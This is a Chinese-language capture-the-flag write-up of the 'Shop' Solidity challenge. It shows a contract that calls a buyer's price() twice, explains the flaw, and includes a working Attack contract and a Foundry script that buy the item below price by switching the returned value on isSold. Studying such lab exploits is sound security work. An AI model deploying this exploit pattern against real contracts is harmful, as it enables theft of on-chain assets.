# Shop 三元运算符

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//在商店以低于要求的价格购买到商品
//0x691eeA9286124c043B82997201E805646b76351a

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;//一开始默认false

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

```

第一次在if条件判断那里调用一次`price()`，要求price>=100且false，if条件过了以后，会把issold改成true，然后再调用一次`price()`,这第二次调用就可以把价格调低了

可以得出，这price和bool值很挂钩的，那就用一个三元运算符，就能轻松解决

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Shop, Buyer} from "./Shop.sol";

contract Attack is Buyer {
    Shop public shop;
    bool public xing;

    constructor(address addr) {
        shop = Shop(addr);
    }

    function attack() external {
        shop.buy();
    }

    function price() external view override returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "../lib/forge-std/src/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0xf120d3090a401e91da9f12471F3bdC7816135809);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-08-09 15:19:09  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ccup1tniq7zv929n>